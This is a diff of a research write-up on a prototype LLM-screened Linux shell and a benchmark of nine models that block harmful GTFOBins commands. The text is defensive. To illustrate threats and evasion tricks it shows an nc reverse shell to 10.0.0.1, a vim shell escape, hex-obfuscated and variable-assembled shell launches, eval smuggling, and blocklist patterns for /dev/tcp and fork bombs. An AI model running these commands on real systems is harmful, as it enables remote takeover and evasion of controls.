@@ -7,9 +7,9 @@
 
 * ***aegish[^name]*** is a prototype Linux shell that intercepts every command a user types. Commands are first screened by a static analysis layer and then sent to an LLM that classifies them as **ALLOW**, **WARN**, or **BLOCK** using a natural-language decision tree — no training pipeline and minimal policy configuration. In production mode, kernel-level enforcement (Landlock) provides a final safety net.
 * 9 LLMs from 4 providers were benchmarked on their ability to distinguish intent: they were tasked to **BLOCK** 676 harmful commands (extracted from GTFOBins) and to correctly classify 496 harmless commands as either **ALLOW** or **WARN**.
-* The harmless benchmark proved to be saturated (96.8–100% harmless acceptance rate for all models). The real differentiator was the malicious detection rate on malicious commands, where **4 of 9 models exceeded 95%**.
+* The harmless benchmark proved to be saturated (96.8–100% harmless acceptance rate for all models). The real differentiator was the malicious detection rate, where **4 of 9 models exceeded 95%**.
 * Surprisingly, **mid-size models outperform flagships**. GPT-5 Mini beats GPT-5.1, and Claude Haiku 4.5 beats both Claude Opus 4.6 and Claude Sonnet 4.5, suggesting that for this specific task, model reasoning capability is not the primary bottleneck.
-* Beyond the LLM, *aegish* includes several safeguards — Landlock kernel enforcement, SHA-256 binary integrity checks, role-based trust levels, audit logging, and rate limiting, many of which were directly motivated by bypass vectors discovered during security audits. However, the system as a whole has not been hardened to the level required for adversarial deployment.
+* Beyond the LLM, *aegish* includes several safeguards — Landlock kernel enforcement, SHA-256 binary integrity checks, role-based trust levels, audit logging, and rate limiting — many of which were directly motivated by bypass vectors discovered during security audits. However, the system as a whole has not been hardened to the level required for adversarial deployment.
 
 [^name]: *aegish* = **aegis** + **sh**. In Greek mythology, the Aegis was a protective shield carried by Athena and Zeus — the word has since come to mean being under the protection of a powerful, knowledgeable, and benevolent source. **sh** is short for "shell."
 
@@ -50,9 +50,9 @@ The complete flow is shown in Figure 1.
 
 
 
-![Flow diagram](../benchmark/results/plots/flow_diagram.png)
+![Flow diagram](https://i.imgur.com/823aSQy.png)
 
-**Figure 1** *aegish* flow. Commands pass through static validation and then the LLM validates them and makes a decision. 
+*Figure 1: aegish command flow. Commands pass through static validation, then the LLM classifies them.*
 
 
 ### The Decision Logic
@@ -89,7 +89,7 @@ The system prompt instructs the LLM to evaluate the command against 13 specific 
 
 * **13. Normal operation:** Standard commands on non-sensitive targets (e.g., `ls -la ~/projects`).
 
-The LLM returns the decision as a structured JSON object, e.g., for the input `vim -c ':!/bin/sh` it might return:
+The LLM returns the decision as a structured JSON object, e.g., for the input `vim -c ':!/bin/sh'` it might return:
 
 ```json
 {
@@ -108,9 +108,9 @@ The LLM is the core decision-maker, but several layers of defense operate before
 
 When a user types a command, it passes through the following stages before a decision is made:
 
-1. **Canonicalization:** The raw command is first normalized into what the shell will actually execute, to avoid offuscation attempts. For example, hex escape sequences are decoded (`$'\x2f\x62\x69\x6e\x2f\x73\x68'` becomes `/bin/sh`). This attempts that the LLM sees what will actually run, not what the attacker chose to write. 
+1. **Canonicalization:** The raw command is first normalized into what the shell will actually execute, to prevent obfuscation. For example, hex escape sequences are decoded (`$'\x2f\x62\x69\x6e\x2f\x73\x68'` becomes `/bin/sh`). This attempts that the LLM sees what will actually run, not what the attacker chose to write.
 
-2. **Static validations:** Before any command reaches the LLM, a static analysis layer catches patterns that don't require semantic reasoning. This includes for example a **regex blocklist** matches known-dangerous signatures such as destructive operations (`rm -rf /`). The rest of the components in this layer are detailed in Appendix M.
+2. **Static validations:** Before any command reaches the LLM, a static analysis layer catches patterns that don't require semantic reasoning. This includes, for example, a **regex blocklist** that matches known-dangerous signatures such as destructive operations (`rm -rf /`). The rest of the components in this layer are detailed in Appendix M.
 
 3. **Command substitution resolution:** In bash, you can embed one command inside another using the `$(...)` syntax. Bash runs the inner command first, then pastes its output into the outer command before executing it. For example, suppose a file `a.sh` contains the text `nc -e /bin/sh 10.0.0.1 4444` (a reverse shell that gives an attacker remote access). The command `bash $(cat a.sh)` first runs `cat a.sh` — which reads the file and outputs its contents — and then substitutes that output in, producing `bash nc -e /bin/sh 10.0.0.1 4444`. The problem is that the LLM would only see the original text `bash $(cat a.sh)`, which looks like an innocent script execution — the malicious payload is hidden inside the file. To address this, *aegish* extracts the inner command, validates it through the full pipeline, and — if it passes — executes it in a sandboxed subprocess. The inner command's output then replaces the `$(...)`, so the LLM evaluates the resolved command and can recognize the reverse shell.
 
@@ -124,7 +124,7 @@ After those steps, the resolved command, along with all context gathered in prio
 
 **Script inspection:** When a command references a script file (e.g., `source deploy.sh`, `python3 script.py`), *aegish* reads the script's contents and includes them in the LLM prompt so the model can reason about what will actually execute and not just the invocation command.
 
-Additional system-level safeguards such as health check failover, rate limiting, audit logging, and others — are detailed in Appendix L.
+Additional system-level safeguards, such as health check failover, rate limiting, audit logging, and others, are detailed in Appendix L.
 
 ## 3. The Benchmark
 
@@ -163,7 +163,7 @@ All 9 models successfully allowed between 96.8% and 100% of harmless commands. A
 
 Since harmless acceptance rate contributes no signal, the rest of the analysis focuses entirely on **malicious detection rate**. Against our 95% target **only 4 of the 9 models met the malicious detection target:** Gemini 3 Flash, Llama Primus, GPT-5 Mini, and Claude Haiku 4.5.
 
-Conversely, several models fell short of the 95% threshold established: Claude Sonnet 4.5 (92.9%), GPT-5.1 (92.6%), Claude Opus 4.6 (92.0%), and GPT-5 Nano (88.3%). Furthermore, Foundation-Sec-8B ranked significantly below the malicious detection target. Its dominant failure mode was classifying malicious commands as WARN rather than strictly enforcing a BLOCK (accounting for 128 of its 145 errors).
+Conversely, several models fell short of the 95% threshold established: Claude Sonnet 4.5 (92.9%), GPT-5.1 (92.6%), Claude Opus 4.6 (92.0%), and GPT-5 Nano (88.3%). Furthermore, Foundation-Sec-8B scored significantly below the malicious detection target. Its dominant failure mode was classifying malicious commands as WARN rather than strictly enforcing a BLOCK (accounting for 128 of its 145 errors).
 
 ### Consistency Across Attack Categories
 
@@ -174,7 +174,7 @@ We evaluate performance using two metrics:
 
 A large gap between these two metrics exposes models that inflate their aggregate score by acing easy, high-volume categories while failing on small, complex ones.
 
-![Micro vs. Macro Detection](../benchmark/results/plots/micro_vs_macro.png)
+![Micro vs. Macro Detection](https://i.imgur.com/TpSoTlo.png)
 *Figure 3: Micro (aggregate) vs. macro (unweighted category average) detection.*
 
 The clear winner on accuracy and consistency is **Gemini 3 Flash**. It not only maintained a high overall detection rate but also exhibited a very small gap between micro and macro performance (just 1%), indicating highly consistent threat recognition across all categories.
@@ -188,10 +188,10 @@ Counterintuitively, across both OpenAI and Anthropic, **mid-size models consiste
 
 1. **Content filters penalize flagships:** (Only for Anthropic models) Opus and Sonnet trigger safety filters on GTFOBins commands, returning empty responses scored as missed detections. Haiku has zero filter activations. If content filter activations were counted as correct detections (the model *did* identify danger), Opus would rise from 92.0% to 95.1% and Sonnet from 92.9% to 97.2%.
 2. **Cautious reasoning:** Opus tended to "over-reason," frequently classifying threats as **WARN** (e.g., "This *could* be dangerous") rather than the required **BLOCK**.
-3. **Struggles with indirect execution:** GPT-5.1 tended to fail to recognize indirect execution vectors, consistently classifying these subtle bypass attempts as ALLOW rather than inspecting them properly.
+3. **Struggles with indirect execution:** GPT-5.1 frequently failed to recognize indirect execution vectors, consistently classifying these subtle bypass attempts as ALLOW rather than inspecting them properly.
 4. **The smallest models lack capability:** While mid-size models hit the sweet spot, scaling down too far degrades performance. GPT-5 Nano is the cheapest and fastest model tested, but completely fails the malicious detection target at 88.3%. Its dominant failure mode isn't caution—it simply fails to recognize the threats, resulting in outright ALLOW classifications on malicious commands (50 ALLOW errors, the most of any model).
 
-For this reasons, we conclude that the optimal model size for this task is mid-tier. Detailed error breakdowns are in Appendices B and D.
+For these reasons, we conclude that the optimal model size for this task is mid-tier. Detailed error breakdowns are in Appendices B and D.
 
 ### Production Viability: Cost and Latency
 
@@ -204,9 +204,9 @@ Figure 4 plots cost-effectiveness against Malicious Detection Rate. The full per
 
 From this plot, we can see that costs range from $0.59 to $12.89 per 1,000 commands. Crucially, **spending more does not buy more detection**: Opus costs 11.5× more than Gemini 3 Flash for a *lower* malicious detection rate.
 
-Similarly in Figure 5 (Appendix C), we can see that **longer inference time does not guarantee better detection**: several faster models achieve higher detection rates than slower ones.
+Similarly in Figure 8 (Appendix C), we can see that **longer inference time does not guarantee better detection**: several faster models achieve higher detection rates than slower ones.
 
-Both cost and latency analyses converge on the same conclusion: the **Pareto-optimal set** consists of efficient, mid-tier models—specifically **Gemini 3 Flash** and **GPT-5-nano**[^pareto]. No other models offer better detection capability at a lower price or latency.
+Both cost and latency analyses converge on the same conclusion: the **Pareto-optimal set** consists of efficient, mid-tier models—specifically **Gemini 3 Flash** and **GPT-5 Nano**[^pareto]. No other models offer better detection capability at a lower price or latency.
 
 [^pareto]: GPT-5 Nano ($0.59/1k) is technically on the Pareto frontier as the cheapest option, but at 88.3% malicious detection it falls below the 95% target established in Section 3 and should not be the default for security-critical classification.
 
@@ -257,7 +257,7 @@ The full list of known vulnerabilities is available in the [consolidated vulnera
 
 
 Beyond vulnerabilities, the approach has several **additional limitations**:
-1. **Latency:** The round-trip time for LLM inference adds latency compared to a native shell. Commands blocked by static validation avoid this cost entirely, but most commands still require an LLM round-trip. Using cache could partially mitigate this problem (See Appendix K for more details)
+1. **Latency:** The round-trip time for LLM inference adds latency compared to a native shell. Commands blocked by static validation avoid this cost entirely, but most commands still require an LLM round-trip. Caching could partially mitigate this (see Appendix K for details).
 2. **Non-determinism:** Even with temperature set to zero and a fixed random seed, LLMs may classify the same command differently across runs — and some providers do not support those parameters at all — making security guarantees inherently probabilistic rather than deterministic.
 3. **No command sequence awareness:** Each command is validated in isolation with no memory of prior commands in the session, so an attacker can decompose a malicious operation into individually benign steps — for example, downloading a payload in one command and referencing it by a benign-looking local path in a later one.
 4. **Network dependency:** Without API connectivity, the system degrades to either blocking all commands (safe mode) or warning on all commands (open mode), with no local reasoning fallback.
@@ -273,12 +273,12 @@ The *aegish* prototype proves that LLMs, combined with static analysis and kerne
 ### Future Work
 
 As future directions we propose:
-* **Offline Mode:** Integrating local models (e.g., via Ollama) to remove network dependencies and data privacy concerns.
-- **User-configurable policy layer:** Allow administrators to define environment-specific rules — for example, whether suspending a system is routine or a potential denial-of-service vector — so the LLM's baseline reasoning can be adapted to context without writing full MAC policies.
-- **Adversarial robustness assessment** Measure how well does this approach holds up against an attacker who knows the system prompt and actively crafts evasion inputs.
-- **Local ALLOW rules:**  Add an allowlist for trivially safe commands (ls, pwd, git status) to reduce latency and cost.
-* **Command History:** Incorporating the history of the previous into the prompts to allow for more nuanced, context-aware decisions and to mitigate attacks that decompose malicious actions into multiple harmful commands.
-- **LLM-generated MAC policies:** Use LLMs to automatically generate and maintain AppArmor or SELinux profiles — lowering the expertise barrier that leaves many systems running overly permissive policies, while retaining the deterministic enforcement guarantees of kernel-level MAC.
+* **Offline mode:** Integrating local models (e.g., via Ollama) to remove network dependencies and data privacy concerns.
+* **User-configurable policy layer:** Allow administrators to define environment-specific rules, for example whether suspending a system is routine or a potential denial-of-service vector, so the LLM's baseline reasoning can be adapted to context without writing full MAC policies.
+* **Adversarial robustness assessment:** Measure how well this approach holds up against an attacker who knows the system prompt and actively crafts evasion inputs.
+* **Local ALLOW rules:** Add an allowlist for trivially safe commands (ls, pwd, git status) to reduce latency and cost.
+* **Command history:** Incorporating the history of previous commands into the prompts to allow for more nuanced, context-aware decisions and to mitigate attacks that decompose malicious actions into multiple harmful commands.
+* **LLM-generated MAC policies:** Use LLMs to automatically generate and maintain AppArmor or SELinux profiles, lowering the expertise barrier that leaves many systems running overly permissive policies while retaining the deterministic enforcement guarantees of kernel-level MAC.
 
 
 
@@ -488,7 +488,8 @@ The false positive blocks come with specific, well-reasoned justifications. Clau
 
 **Ranking Table:** Ranking table with standard errors, and all metrics. All benchmark latencies include rate-limit queuing overhead (see Appendix G); Gemini 3 Flash is corrected for its 76.7% rate-limit component (raw: 70.9s).
 
-![Ranking Table](../benchmark/results/plots/ranking_table_full.png)
+![Ranking Table](https://i.imgur.com/oQavd0U.png)
+*Figure 5: Full model ranking with standard errors and all metrics.*
 
 Four models meet all three targets (≥95% detection, ≥95% pass, ≥0.95 score): Gemini 3 Flash, Llama Primus, GPT-5 Mini, and Claude Haiku 4.5. The remaining five miss the 95% detection threshold.
 
@@ -500,23 +501,24 @@ Because harmless acceptance rate is saturated (~98.5% ± 1.5% for all models), t
 **Category Heatmap:** Per-model malicious detection rates across all 8 GTFOBins categories. Reveals that "command" (bottom row) is hardest and "reverse-shell" (top row) is fully solved.
 
 ![Category Heatmap](https://i.imgur.com/A9KQSFS.png)
-
+*Figure 6: Per-model malicious detection rates across all 8 GTFOBins categories.*
 
 **Latency Distribution:** Mean and P90 latency by model. Reveals the rate-limiting artifact in Gemini 3 Flash and Anthropic models.
 
-![Latency Distribution](../benchmark/results/plots/latency_distribution.png)
+![Latency Distribution](https://i.imgur.com/nfPyPBJ.png)
+*Figure 7: Mean and P90 latency by model.*
 
 **Latency vs. Malicious Detection Rate:**
 
-![Latency vs. Malicious Detection Rate](../benchmark/results/plots/latency_vs_malicious_detection_rate.png)
-*Figure 5: Mean latency vs. malicious detection rate. Gemini 3 Flash is corrected for rate-limit queuing (76.7% removed; raw was 70.9s). Other models show raw benchmark latency, which includes 33–39% overhead for OpenAI and 73–77% for Anthropic (see Appendix G).*
+![Latency vs. Malicious Detection Rate](https://i.imgur.com/VOWT39M.png)
+*Figure 8: Mean latency vs. malicious detection rate. Gemini 3 Flash is corrected for rate-limit queuing (76.7% removed; raw was 70.9s). Other models show raw benchmark latency, which includes 33–39% overhead for OpenAI and 73–77% for Anthropic (see Appendix G).*
 
 Because all providers experienced different rate-limit overhead during concurrent benchmarking, cross-provider latency comparisons should be interpreted with caution. Within-provider patterns are more reliable: in every provider family, the best-detecting model is not the slowest, confirming that longer inference time does not buy better classification. In production (single-query), latencies would be substantially lower across the board — estimated at 10–15s for most models once queuing is removed.
 
 **Cost Comparison:** Bar chart of cost per 1,000 commands. Opus at $12.89 dwarfs the $0.59–$2.78 range of other models.
 
 ![Cost Comparison](https://i.imgur.com/IEfk8x7.png)
-
+*Figure 9: Cost per 1,000 commands by model.*
 
 | Model | Malicious Detection Rate | Cost/1k Commands | Monthly (1k cmds/day) |
 |-------|:-------------:|:----------------:|:---------------------:|
@@ -711,7 +713,7 @@ The blog notes that false positive blocks come with "specific, well-reasoned jus
 The remaining ~14% are scattered across miscellaneous categories. The concentration in GUI apps and package managers suggests that these false positives reflect genuine ambiguity in the threat model rather than model confusion — a production deployment would likely want to whitelist specific GUI applications and package management commands for the user's environment, rather than treat these as model errors to be fixed.
 
 
-## Appendix K: Prompt caching as a production multiplier.
+## Appendix K: Prompt Caching as a Production Multiplier
 
 The cost and latency figures above reflect raw API calls with no caching. In production, *aegish* enables LiteLLM's prompt caching, and the architecture is well suited for it: the system prompt (~13 KB) is *identical* for every command — only the user's single-line command changes per request. Research shows prompt caching can deliver up to 80% latency reduction and 90% cost reduction without affecting output quality. For a tool where every invocation sends the same 13 KB system prompt followed by a short user message, the cache hit rate approaches 100%. This would bring Gemini 3 Flash's ~10s corrected latency closer to 2–3s, and GPT-5 Mini's $1.12/1k closer to $0.11–0.22/1k. These are theoretical projections based on provider-reported caching benefits, not measured values, but the architectural fit is unusually strong.
 
@@ -744,7 +746,7 @@ Beyond the core validation pipeline described in Section 2, *aegish* includes se
 
 ## Appendix M: Static Pre-LLM Validation
 
- This layer is composed by:
+This layer is composed of:
 - A **regex blocklist** matches known-dangerous signatures like reverse shells (`/dev/tcp/`) or fork bombs — and blocks them instantly with zero latency cost.
 - A **syntax tree walker** parses the command's grammatical structure and looks inside loops, conditionals, and function bodies for **variables used as command names**. For example, in `a=ba; b=sh; $a$b` an attacker stores fragments in variables that, when concatenated, spell out `bash` — a shell the user shouldn't be able to launch. The LLM would only see the raw text with dollar signs; bash itself would silently assemble and execute the real command. The syntax tree walker catches this *before* bash ever performs the substitution.
 - **Commands that execute other commands** — specifically `eval` (which runs its argument as a new command), `source` (which runs the contents of a file), and `.` (shorthand for `source`) — are blocked when their arguments contain variables, because the actual payload is hidden until runtime. For instance, `a=payload; eval $a` stores an arbitrary command in a variable and then executes it, completely bypassing text-based analysis.
